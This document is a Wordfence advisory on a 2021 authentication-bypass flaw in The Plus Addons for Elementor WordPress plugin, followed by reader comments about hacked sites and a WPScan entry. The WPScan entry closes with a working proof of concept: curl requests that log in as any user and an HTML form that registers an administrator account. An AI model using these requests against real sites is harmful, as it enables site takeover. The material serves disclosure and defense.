# Critical 0-day in The Plus Addons for Elementor Allows Site Takeover

***UPDATE 2:*** ***As of late March 9th, 2021, the vulnerabilities have been fully patched in version 4.1.7. We highly recommend updating to this version immediately to keep your sites secure.  Special thanks to the plugin developers for working as quickly as possible to resolve these issues.***

***UPDATE 1:* *As of March 9th, 2021, the vulnerability is still not fully patched. The plugin developer released a partially patched version of the plugin (4.1.6) shortly after our disclosure, however, the update does not fully address the vulnerability. We are in contact with the developer and they are working quickly on the additional fixes required, we expect a new patch will be released shortly. We will update this post once a fully sufficient patch has been released.***

Today, March 8, 2021, the Wordfence Threat Intelligence team became aware of a critical 0-day in [The Plus Addons for Elementor](https://theplusaddons.com/), a premium plugin that we estimate has over 30,000 installations. This vulnerability was [reported this morning to WPScan by Seravo](https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89), a hosting company. The flaw makes it possible for attackers to create new administrative user accounts on vulnerable sites, if user registration is enabled, along with logging in as other administrative users.

[The Plus Addons for Elementor Lite](https://wordpress.org/plugins/the-plus-addons-for-elementor-page-builder/), the free version by the same developer, does not appear to be vulnerable to this exploit.

Wordfence Premium customers received a rule on March 8, 2021 to protect against active exploitation of this vulnerability. Wordfence users still using the free version will receive protection on April 7, 2021.

If you are using The Plus Addons for Elementor plugin, we strongly recommend that you deactivate and remove the plugin completely until this vulnerability is patched. If the free version will suffice for your needs, you can switch to that version for the time being. If your site’s functionality is dependent on this plugin, we recommend completely removing any registration or login widgets added by the plugin and disabling registration on your site. No patched version is available at the time of this publication.

**Description:** Privilege Escalation

**Affected Plugin:** The Plus Addons for Elementor

**Plugin Slug:** theplus\_elementor\_addon

**Affected Versions:** <= 4.1.6

**CVE ID:** [2021-24175](https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89)

**CVSS Score:** 9.8 (Critical)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Fully Patched Version:** 4.1.7

“The Plus Addons for Elementor” is a plugin designed to add several additional widgets to be used alongside Elementor. One of these widgets added the ability to add a user login and registration form to an Elementor page. Unfortunately, this functionality was improperly configured and allowed attackers to register as an administrative user, or to log in as an existing administrative user.

It should be noted that this vulnerability can still be exploited *even if you do not have an active login or registration page that was created with the plugin*. This means that any site running this plugin is vulnerable to compromise.

At this time, we are releasing very minimal details due to this being an actively exploited vulnerability. We may decide to release more details in the future, but in the meantime we recommend you take appropriate measures to secure your site.

## Indicators of Compromise

At this time, we have very limited indicators of compromise. However, we believe that attackers are adding user accounts with usernames as the registered email address based on how the vulnerability creates user accounts, and in some cases installing a malicious plugin labeled `wpstaff`. We strongly recommend checking your site for any unexpected administrative users or plugins you did not install.

*We will update this section as we learn more.*

## Response timeline

**March 8th, 2021 8:55 AM UTC** – New vulnerability entry in WPScan reporting 0-day vulnerability in the The Plus Addons for Elementor plugin.

**March 8th, 2021 1:32 PM UTC** – Wordfence Threat Intelligence is alerted to the new vulnerability report and begins to triage the vulnerability.

**March 8th, 2021 2:08 PM UTC** – We verify the existence of the vulnerability and create a proof of concept.

**March 8th, 2021 2:20 PM UTC** – We create and begin testing a firewall rule to protect against the vulnerability.

**March 8th, 2021 2:25 PM UTC** – We reach out to the plugin developer to make sure that they are aware of the vulnerability and offer to provide details if required.

**March 8th, 2021 2:50 PM UTC** – The firewall rule is deployed to premium users.

**April 7th, 2021** – Wordfence Free users receive the firewall rule.

## Conclusion

In today’s post, we detailed a zero-day vulnerability being actively exploited in The Plus Addons for Elementor, a plugin that allows unauthenticated attackers to escalate their privileges on a vulnerable WordPress installation. This can be used to completely take over a WordPress site. This vulnerability currently remains unpatched as of this morning and, therefore, we strongly recommend deactivating and removing the plugin until a patch has been released.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210308&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) customers received a rule on March 8, 2021 to protect against active exploitation of this vulnerability. Wordfence users still using the free version will receive protection on April 7, 2021.

Please forward and share this post widely so that those using this vulnerable plugin can take fast action to protect their sites as this zero-day vulnerability is currently being exploited in the wild.

*Special thanks to Ramuel Gall, Wordfence Threat Analyst and QA Engineer, and Kathy Zant, Wordfence’s Director of Marketing, for their contributions to this post and research pertaining to the vulnerability.*

  Had a client today that was hit by this I think. It-s using the premium version of the plugin. Waiting for an update in the meanwhile reverted back to WordPress registration

  Hi there,

  I'm sorry to hear your client was affected by this, but glad to hear you have reverted the site back to the default WordPress registration to keep the site secure! I recommend taking a moment to review [this guide](https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/), if you haven't already, to ensure the site has no remnants of compromise left. The first things you should check for are rogue plugins and rogue administrative user accounts as those are the IOCs we are seeing with this campaign.

  Just a heads up the vulnerability can be taken advantage of even if no registration and login page has been created.

  Hi Kevin,

  Unfortunately, the vulnerabilities are still exploitable even if the "WP Login & Register" widget is disabled. For that reason, we recommend temporarily deactivating and removing the plugin until a patch has been released.

  Hi Sharif,

  The plugin developer has acknowledged the vulnerabilities and released a patch this afternoon. We tested the patch and found it to be insufficient so we informed them of what was missing and expect to see a second, fully sufficient patch, released here soon. They have been very responsive for us thus far.

  Unfortunately, the latest update didn't fully address the security issues. We are working closely with the plugin's developer to ensure an optimal patch is released. I can assure you that they are working quickly to get a fix out to their customers and I presume it will be released by the end of today.

  Since I'm becoming more and more interested in security (flaws) I was wondering if the cause of the vulnerability will be disclosed. Will you publish data on what the vulnerability was and how it can be exploited by people with wrong intentions?

  Not sure when it was officially noticed, or known about, but we have been hacked on the 3rd of March, the attacker successfully created an account with admin privileges and on the 4th of March the attacker logged in successfully. We were not aware until March 9th while cleaning it up and working with WPforms since we were using their registration add-on. Shorlty after concluding with wpform around 4:45pm we received an email from The Plus Addons for Elementor about the breach at 4:56pm on the 9th.

  On our front end we were still using the paid version of The Plus Addons for Elementor for the login form ...

  Then all made sense... of what happened.

  Hi there,

  Hi Mark,

  Unfortunately, it is hard to say with 100% certainty whether or not a data breach has occurred without a full forensic investigation. However, it is highly likely that some data was breached. If your site has been compromised, you should assume that all the data has been compromised and you should notify your site users so that they are aware and can take the appropriate actions like changing their passwords.

  They hacked three of my sites that were using this widget, here is another email address used inurypar76@gmail.com

  This hack affected all the sites on my server, not just those three using the plus.

  Some sites where redirecting to another site (the sites with the plus installed), other sites were just showing critical errors (sites using Divi) and weird code. I had to roll my whole cpanel account back to two weeks ago as at that time I did not know a safe date.

  The first time I rolled the account back and got the sites working again, they re-hacked one of these sites again within 12 hours and caused the same issue all over again. Until I woke up to what was going on and deleted some of the sites temporarily as a emergency measure and updated the others to the latest version of the plus.

  Very serious, as it affected all the sites in my cpanel, not just the ones with the register widget.

  Funny when I saw that email trainwordpressai@site.com register to one of the sites again, in no time the whole cpanel was infected and the sites all redirecting and crashing.

  The sites that I rolled back to two weeks ago and updated all seem to be fine now. I have scanned with wordfence sensitive search, and securi. Would all the malicious code be gone or should I take further action and hire a developer to scan database etc as my whole cpanel was affected?

  Thank you, even though this was very scary and serious I am so much wiser now and have hardened ALL my sites up.

## WordPress Plugin Vulnerabilities

# The Plus Addons for Elementor Page Builder < 4.1.7 - Authentication Bypass

### Description

The plugin was being actively exploited to by malicious actors to bypass authentication, allowing unauthenticated users to log in as any user (including admin) by just providing the related username, as well as create accounts with arbitrary roles, such as admin. These issues can be exploited even if registration is disabled, and the Login widget is not active.

The vendor was notified by the two reporters:

- On March 6th, 2021 by Seravo, which was answered on March 7th, and the vulnerability acknowledged on March 9th.

- On March 7th and 8th 2021 by WP Charged who saw the attacks start on March 5th, 2021.

We (WPScanTeam) escalated to issues to Envato on Match 8th, 2021 after confirming them and finding another similar authbypass issue.

The free version of the plugin on the WordPress repository did not seem affected by this issue.

### Proof of Concept

The "theplus\_ajax\_login" and "theplus\_google\_ajax\_register" AJAX actions, available to unauthenticated users allow trivial authentication bypass as any user by only providing the related username
curl -X POST --data action=theplus\_ajax\_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.php
curl -X POST --data action=theplus\_google\_ajax\_register --data email=admin --data nonce=a -iLSS https://example.com/wp-admin/admin-ajax.php
Then, the "theplus\_google\_ajax\_register" AJAX action can also allow any unauthenticated user to create accounts with arbitrary role, such as admin, and then get logged in automatically
<form method="POST" action="https://example.com/wp-admin/admin-ajax.php">
<input value="newadmin" name="name" type="text">
<input value="test@example.com" name="email" type="text">
<input value="test" name="password" type="text">
<input value="theplus\_google\_ajax\_register" name="action" type="text">
<input value="administrator" name="tp\_user\_reg\_role" type="text">
<input value="any" name="nonce" type="text">
<input type="submit" />
</form>
Finally, the "theplus\_ajax\_register" AJAX action can also allow unauthenticated user to create accounts with arbitrary role, such as admin, however this require the registration to be enabled, and the Login widget to be used.
